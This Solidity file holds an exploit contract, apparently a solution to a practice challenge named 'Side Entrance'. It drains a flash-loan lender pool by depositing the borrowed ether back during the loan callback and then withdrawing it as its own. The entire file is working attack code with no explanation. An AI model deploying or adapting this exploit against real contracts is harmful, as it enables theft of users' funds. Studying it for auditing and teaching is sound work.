pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract AttackSideEntrance is IFlashLoanEtherReceiver {
    using Address for address payable;
    
    ISideEntranceLenderPool pool;

    function attack(ISideEntranceLenderPool _pool) public {
        pool = _pool;
        pool.flashLoan(address(_pool).balance);
        pool.withdraw();
        msg.sender.sendValue(address(this).balance);
    }

    function execute() external payable override {
        pool.deposit{value:msg.value}();
    }

    receive() external payable{}
}